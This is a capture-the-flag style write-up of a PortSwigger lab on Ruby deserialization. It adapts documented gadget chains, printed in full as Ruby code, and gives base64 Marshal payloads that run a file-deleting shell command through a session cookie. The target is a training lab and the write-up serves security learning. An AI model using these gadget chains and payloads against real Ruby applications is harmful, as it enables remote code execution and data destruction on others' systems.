---
title: " PortSwiggerlabs: Exploiting Ruby deserialization using a documented gadget chain "
date: 2026-06-29 00:00:00 +0000
categories: [PortSwiggerLabs , Insecure Deserialization ]
tags: [PortSwiggerLabs , Insecure Deserialization , Challenge , Web_Attacks ]
---


## Information : 


This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter


## Solution : 


As always , we first login as wiener : 

<img width="1643" height="675" alt="image" src="https://github.com/user-attachments/assets/48b00c42-7329-4e7a-b179-7667ebedd929" />

Then we check Burp's Sitemap :

<img width="1912" height="982" alt="image" src="https://github.com/user-attachments/assets/28768fe7-23fb-42f8-9c10-d635e824b8b3" />

We find that our cookie wasn't automatically decoded by burp , so it's not going to be a PHP or Java serialized object . Quick Note , if we had Pro it would flag this as a serialized object and make our life easier , but in our case let's try decoding it manually to see if it is an actual serialized object. 

<img width="1911" height="565" alt="image" src="https://github.com/user-attachments/assets/5cbe739b-eb23-4268-8ea5-4b187c57940b" />

Now we know this is a serialized object , we just don't know what language exactly , taking a look at the Hint , we see that we should look at Ruby gadgets : 

Looking online we find this great post that explains how they got the first gadget chain to achieve RCE on Ruby2.X : 

<img width="1466" height="977" alt="image" src="https://github.com/user-attachments/assets/07c27546-ea53-4421-b94c-ad983bc0f92b" />

We can take their code just instead of id , we add the command to remove the file from carlos directly : 

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, '|rm /home/carlos/morale.txt 1>&2')

puts 'STEP n'
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts 'STEP n-1'
specific_file <=> other_specific_file rescue nil
puts
```

<img width="1605" height="768" alt="image" src="https://github.com/user-attachments/assets/8e217f3a-f092-4915-84f6-ffa7bfcf1d09" />

We got the payload in HEX format , we could encode it ourselves but notice the Code keeps breaking , this is bcs i had ruby 3.7 and for the exploit to work , it needed 2.X : 

```bash
sudo apt install rbenv
rbenv install 2.7.8
eval "$(rbenv init - bash)" : Initialize rbenv in your shell
rbenv global 2.7.8 : Set it as the global version :
```

<img width="1083" height="616" alt="image" src="https://github.com/user-attachments/assets/fae075af-59a6-4298-a264-739407e66b4a" />

Perfect we got our encoded payload : 

```bash
BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uBjoRQGxvYWRlZF9mcm9tSSIqfHJteyRJRlN9L2hvbWUvY2FybG9zL21vcmFsZS50eHQgMT4mMgY6BkVUbzsIADoRQGRldmVsb3BtZW50Rg==
```

Another way to do this is using the Script from devcraft.io : 

```bash
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
```

<img width="1352" height="835" alt="image" src="https://github.com/user-attachments/assets/c592d710-47e1-4c13-bd2a-511cf31d69ae" />

Just make sure , at the end we add the 'puts Base64.encode64(payload)' : 

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

In case Auto Include doesn't work for you , try adding the dependencies manually : 

```ruby
require 'net/protocol'
require 'rubygems'
require 'rubygems/requirement'
require 'rubygems/package'
```

<img width="935" height="828" alt="image" src="https://github.com/user-attachments/assets/44ab938e-7114-43a2-ae7d-a5c0ed7a5f5c" />

Of course you can just use an online compiler for Ruby : 

```bash
https://www.tutorialspoint.com/compilers/online-ruby-compiler.htm
```
<img width="1619" height="913" alt="image" src="https://github.com/user-attachments/assets/87e60b58-30e5-4428-87cf-8bdc93f820c3" />

Finally we just add this inside the Burp Request or inside the DEV Tools , just make sure you URL Encode this before : 

```bash
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

<img width="1879" height="936" alt="image" src="https://github.com/user-attachments/assets/78d6ac01-6967-4024-b9b4-cad428f8f845" />

Just like that we are able to solve the Lab . 

That was all for this lab , see you in the next one :)
